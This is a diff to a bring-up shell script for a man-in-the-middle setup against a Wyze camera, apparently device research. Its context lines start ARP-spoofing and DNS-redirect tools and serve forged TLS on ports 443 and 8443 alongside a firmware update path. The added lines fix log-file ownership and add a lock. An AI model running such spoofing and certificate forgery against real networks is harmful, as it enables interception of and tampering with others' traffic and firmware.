@@ -23,6 +23,13 @@ for f in /tmp/ota/arm.log /tmp/dns.log /tmp/arp.log /tmp/tls.log /tmp/img8080.lo
   sudo -n touch "$f" 2>/dev/null && sudo -n chown "$(id -u)" "$f" 2>/dev/null
 done
 CERTS="$HERE/../certs"
+# The root-run forge (launchd wyze-forge) appends to /tmp/tls.log and /tmp/ota/forge.log; when it
+# recreates them they come back root-owned and this user-run wrapper's redirections fail with
+# "Permission denied" (measured 2026-11-04). Re-own the mutable set on every run, after any
+# root process had a chance to clobber them.
+for f in /tmp/tls.log /tmp/dns.log /tmp/arp.log /tmp/img8080.log /tmp/img.log /tmp/mqproxy.log; do
+  [ -f "$f" ] && [ "$(stat -f %Su "$f" 2>/dev/null)" != "$(id -un)" ] && sudo -n chown "$(id -u)" "$f" 2>/dev/null
+done
 CAP_DIR="${CAP_DIR:-/tmp/fwserve}"
 CAP_PATH="${CAP_PATH:-wuv2/upgrade/HL_CAM4/firmware/4.52.17.32.tar}"
 CAM_MAC="${1:-${CAM_MAC:-80:48:2c:4b:cf:0b}}"
@@ -66,6 +73,21 @@ for f in /tmp/ota/chain.pem /tmp/serve443.pem /tmp/iot2.pem /tmp/iot2.key \
          /tmp/dns.log /tmp/arp.log /tmp/tls.log /tmp/mqproxy.log; do
   sudo -n install -m 0644 -o "$(id -un)" -g "$(id -gn)" /dev/null "$f" 2>/dev/null || true
 done
+
+# Single-flight guard: two overlapping generations kill each other's children (each run's
+# free_port/pkill sweeps SIGTERM the previous run's dns/arp/forge kids mid-bringup — measured
+# 2026-11-04 as permanent plane flapping). With KeepAlive, exiting 0 when a peer holds the lock
+# just defers to the next respawn; the lock holder releases via EXIT trap.
+LOCK=/tmp/wyze_mitm_bringup.lock
+if [ -s "$LOCK" ]; then
+  other=$(cat "$LOCK" 2>/dev/null)
+  if [ -n "$other" ] && kill -0 "$other" 2>/dev/null && [ "$other" != "$$" ]; then
+    echo "bring-up already running as pid $other — deferring"
+    exit 0
+  fi
+fi
+echo $$ > "$LOCK"
+trap 'rm -f "$LOCK"' EXIT
 
 # camera address: arp is the authority, and a sweep is the only way to find a moved unit
 CAM=""
@@ -186,6 +208,8 @@ sudo "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
 sudo /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAM_MAC" "$GW" "$GWMAC" "$IFACE" > /tmp/arp.log 2>&1 &
 # forged TLS on 443 (device API/S3) and 8443 (the alternate port the device also validated).
 for port in 443 8443; do
+  # the root forge may have recreated /tmp/tls.log root-owned after our startup chown
+  [ -f /tmp/tls.log ] && [ "$(stat -f %Su /tmp/tls.log)" != "$(id -un)" ] && sudo -n chown "$(id -u)" /tmp/tls.log 2>/dev/null
   if forge_ok "$port"; then
     echo "tls: port $port already served by a contract-complete forge — adopting it"
     continue
